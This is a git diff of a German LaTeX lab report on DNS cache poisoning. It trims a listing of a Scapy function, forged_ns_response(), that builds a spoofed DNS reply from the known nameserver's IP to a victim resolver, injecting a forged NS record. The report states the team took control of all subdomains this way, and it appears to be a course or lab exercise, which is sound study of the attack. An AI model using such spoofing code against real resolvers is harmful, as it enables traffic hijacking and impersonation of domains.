@@ -65,28 +65,18 @@ Nach mehreren weiteren Versuchen war das \glqq injecten\grqq\ eines NS-Records l
 \end{itemize}
 
 \section{Verbesserungen im Code}
-Durch die aufgezählten Veränderungen, ergab sich auch ein leicht anderer Source-Code für die die Funktion \emph{forged\_ns\_response()}. Die geänderten Codezeilen werden im folgenden Listing farblich hervorgehoben, um die Fehler noch einmal deutlich zu kennzeichnen.
+Durch die aufgezählten Veränderungen, ergab sich auch ein leicht anderer Source-Code für die die Funktion \emph{forged\_ns\_response()}. Die geänderten Codezeilen werden in folgendem Listig aufgezählt. Aufgrund der Vergleichbarkeit werden die unveränderten Codezeilen nicht dargestellt.
 \begin{center}
 \begin{lstlisting}
 def forged_ns_response(id, target_domain, known_ns_ip):
     response = Ether() / IP(src=known_ns_ip, dst=victim_dns_ip, flags=2) / UDP(
-        sport=53, dport=victim_dns_port_out) / DNS(
-        id=id,  # Query ID / transaction id
-        qr=1,  # Response
-        opcode=0,  # QUERY
-        aa=1,  # Authoritative answers, as we are sending a response
-        tc=0,  # Not truncated
+
+        ...
+        
         rd=1,  # Mirror request flag
-        ra=1,  # Recursion available
-        z=0,  # Reserved and must be zero
-        rcode=0,  # Response code for "ok"
-        qdcount=1,  # Question record count
-        nscount=1,  # Authority count
-        arcount=1,  # Additional record count
-        ancount=1,  # Answer count
-        # AD and CD bits are defined in RFC 2535
-        ad=0,  # Authentic Data
-        cd=0,  # Checking Disabled
+
+        ...
+
         # DNS Question Record
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
@@ -97,7 +87,6 @@ def forged_ns_response(id, target_domain, known_ns_ip):
     return response
 \end{lstlisting}
 \end{center}
-
 Durch die gezeigten Änderungen waren wir letztendlich in der Lage einen gefälschten NS-Record in den Cache des Victim-DNS zu schleusen und somit alle Subdomains unter unsere Kontrolle zu bringen wie auch im folgenden Bild zu sehen ist.
 \begin{figure}
 	\centering
